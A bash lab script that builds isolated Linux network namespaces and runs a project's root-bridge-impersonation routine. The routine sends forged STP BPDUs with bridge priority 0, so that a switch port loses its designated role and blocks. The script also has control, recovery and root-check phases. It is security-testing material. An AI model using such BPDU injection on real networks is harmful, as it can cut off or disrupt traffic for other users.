#!/usr/bin/env bash
# Isolated STP priority manipulation lab (Linux only, needs root).
#
# Topology, all inside network namespaces:
#
#   root --(veth)-- [switch: br0 with STP, port sw-r]   (sw-r is the root port)
#                   [switch port sw-x] --(veth)-- attacker   (a shared segment with one more bridge)
#
#   root:     a bridge (rb0, priority 8192), the real root of the spanning tree.
#   switch:   a bridge running 802.1D Spanning Tree (kernel STP). Its own priority is 32768.
#   attacker: sends configuration BPDUs that name the real root and carry the same root path
#             cost as the switch (read from the switch), with a bridge priority set by PRIORITY.
#
# On the segment that holds sw-x and the attacker, both bridges have the same cost to the
# root. The designated port of that segment is the one whose bridge ID is lower. A bridge
# that advertises a lower priority than the switch wins the election, so sw-x becomes
# non-designated and blocks. This is the designated-port variant. It is not a root takeover:
# the root stays the real root, and the lab reads the port state of sw-x, not the root port.
#
#   Phase 1 (baseline): sw-x is forwarding (the switch is designated on its segment).
#   Phase 2 (control): the attacker advertises a priority above the switch's (61440). The
#            switch keeps sw-x designated and forwarding.
#   Phase 3 (attack): the attacker advertises priority 0. sw-x must change to blocking.
#   Phase 4 (recovery): the attacker stops. sw-x returns to forwarding once the claim ages out.
#
# The port state is read with `bridge link show dev sw-x`. The root port is checked too,
# so the lab shows that the root is unchanged.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/stp_priority_manipulation_lab.sh
#
# Requirements: iproute2 (ip and bridge), and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ATTACKER_MAC="02:00:00:00:00:40"
INTERVAL=2.0
SETTLE_SECONDS=12
CONTROL_CLAIMS=6
ATTACK_CLAIMS="${ATTACK_CLAIMS:-12}"     # 12 x 2 s = 24 s of claims
CONTROL_PRIORITY=61440                    # worse than the switch's 32768, so it must not win
ATTACK_PRIORITY=0                         # better than the switch's 32768, so it should win
RECOVER_SECONDS=30

stop_lab() {
    for ns in attacker root switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

# Remove leftovers from a previous interrupted run.
stop_lab

ip netns add switch
ip netns add root
ip netns add attacker

ip link add r-sw type veth peer name sw-r
ip link set r-sw netns root
ip link set sw-r netns switch

ip link add sw-x type veth peer name a-x
ip link set sw-x netns switch
ip link set a-x netns attacker

# Switch: 802.1D STP enabled, with short timers. Priority 32768 (kernel default).
ip netns exec switch ip link add br0 type bridge stp_state 1 \
    forward_delay 200 hello_time 200 max_age 600
ip netns exec switch ip link set br0 up
for port in sw-r sw-x; do
    ip netns exec switch ip link set "$port" master br0
    ip netns exec switch ip link set "$port" up
done

# Real root bridge: priority 8192.
ip netns exec root ip link add rb0 type bridge stp_state 1 priority 8192 \
    forward_delay 200 hello_time 200 max_age 600
ip netns exec root ip link set rb0 up
ip netns exec root ip link set r-sw master rb0
ip netns exec root ip link set r-sw up

ip netns exec attacker ip link set a-x address "$ATTACKER_MAC"
ip netns exec attacker ip link set a-x up

ROOT_MAC="$(ip netns exec root ip -o link show rb0 | grep -o 'link/ether [0-9a-f:]*' | awk '{print $2}')"

# The state of a switch port: "forwarding", "blocking", "listening", "learning", or "none".
port_state() {
    local state
    state="$(ip netns exec switch bridge link show dev "$1" 2>/dev/null | grep -o 'state [a-z]*' | awk '{print $2}')"
    echo "${state:-none}"
}

# The root port number of the switch (0 when the switch is the root).
root_port_number() {
    ip netns exec switch cat /sys/class/net/br0/bridge/root_port
}

# The switch's root path cost to the real root, used by the attacker so that the costs tie.
root_path_cost() {
    ip netns exec switch cat /sys/class/net/br0/bridge/root_path_cost
}

PRIORITY_CODE='
import os, threading
from macabre.attacks.root_bridge_impersonation import RootBridgeImpersonationConfig, run_root_bridge_impersonation
stats = run_root_bridge_impersonation(
    RootBridgeImpersonationConfig(
        iface="a-x",
        root_priority=8192,
        root_mac=os.environ["ROOT_MAC"],
        root_path_cost=int(os.environ["COST"]),
        bridge_priority=int(os.environ["PRIORITY"]),
        count=int(os.environ["CLAIMS"]),
        interval=float(os.environ["INTERVAL"]),
    ),
    threading.Event(),
    lambda _: None,
)
priority = os.environ["PRIORITY"]
print(f"Attacker: sent {stats.frames} BPDUs from {stats.sender_mac} with bridge priority {priority}")
'

# Start a claim in the background, sampling the port state at each time in SAMPLES, then wait.
# Results go to the array STATES. The attacker's claim is sent with the switch's own root cost.
run_claim() {
    local priority="$1" claims="$2"
    shift 2
    ip netns exec attacker env PYTHONPATH="$ROOT/src" ROOT_MAC="$ROOT_MAC" COST="$COST" \
        PRIORITY="$priority" CLAIMS="$claims" INTERVAL="$INTERVAL" \
        "$PY" -c "$PRIORITY_CODE" &
    local pid=$!
    STATES=()
    local last=0 at
    for at in "$@"; do
        sleep $(( at - last ))
        last=$at
        STATES+=("$(port_state sw-x)")
    done
    wait "$pid"
}

echo "Waiting ${SETTLE_SECONDS}s for the real root to be elected"
sleep "$SETTLE_SECONDS"

COST="$(root_path_cost)"
echo "Switch root path cost: $COST (the attacker advertises the same cost)"
echo

# --- Phase 1: baseline -----------------------------------------------------

echo "Phase 1: baseline (no attacker)"
BASE_STATE="$(port_state sw-x)"
echo "  sw-x: $BASE_STATE"
echo "  switch root port: $(root_port_number) (sw-r is port 1)"
echo

# --- Phase 2: control ------------------------------------------------------

echo "Phase 2: control, attacker advertises bridge priority $CONTROL_PRIORITY"
run_claim "$CONTROL_PRIORITY" "$CONTROL_CLAIMS" 4
CONTROL_STATE="${STATES[0]}"
echo "  t+4s sw-x: $CONTROL_STATE"
echo

# --- Phase 3: attack -------------------------------------------------------

echo "Phase 3: attacker advertises bridge priority $ATTACK_PRIORITY, $ATTACK_CLAIMS BPDUs every ${INTERVAL}s"
run_claim "$ATTACK_PRIORITY" "$ATTACK_CLAIMS" 4 12 20
echo "  t+4s sw-x: ${STATES[0]}"
echo "  t+12s sw-x: ${STATES[1]}"
echo "  t+20s sw-x: ${STATES[2]}"
ATTACK_STATES=("${STATES[@]}")
echo

# --- Phase 4: recovery -----------------------------------------------------

echo "Phase 4: attacker stopped; waiting ${RECOVER_SECONDS}s for the claim to age out"
sleep "$RECOVER_SECONDS"
RECOVERED_STATE="$(port_state sw-x)"
echo "  sw-x: $RECOVERED_STATE"
ROOT_PORT_AFTER="$(root_port_number)"
echo "  switch root port: $ROOT_PORT_AFTER"
echo

# --- Verdict ---------------------------------------------------------------

if [[ "$BASE_STATE" != "forwarding" ]]; then
    echo "Baseline: sw-x is $BASE_STATE, not forwarding. Result unreliable."
    exit 2
fi
if [[ "$CONTROL_STATE" != "forwarding" ]]; then
    echo "Control: a worse priority changed sw-x to $CONTROL_STATE. Result unreliable."
    exit 2
fi
echo "Baseline: sw-x forwards on the shared segment. OK"
echo "Control: a worse bridge priority leaves sw-x forwarding. OK"

BLOCKED=1
for state in "${ATTACK_STATES[@]}"; do
    [[ "$state" == "blocking" ]] || BLOCKED=0
done
if (( BLOCKED )); then
    echo "Attack: sw-x was blocking for the whole run. The lower priority took the designated port. Vulnerable."
else
    echo "Attack: sw-x states during the run were ${ATTACK_STATES[*]}. Not held. Protected or unreliable."
fi

if [[ "$RECOVERED_STATE" == "forwarding" ]]; then
    echo "Recovery: sw-x forwards again once the attacker stopped. OK"
else
    echo "Recovery: sw-x is $RECOVERED_STATE, not forwarding."
fi
if [[ "$ROOT_PORT_AFTER" == "1" ]]; then
    echo "Root: the switch's root port is still sw-r, so the real root is unchanged. OK"
else
    echo "Root: the switch's root port changed to $ROOT_PORT_AFTER. This is a root change, not the designated-port effect."
fi
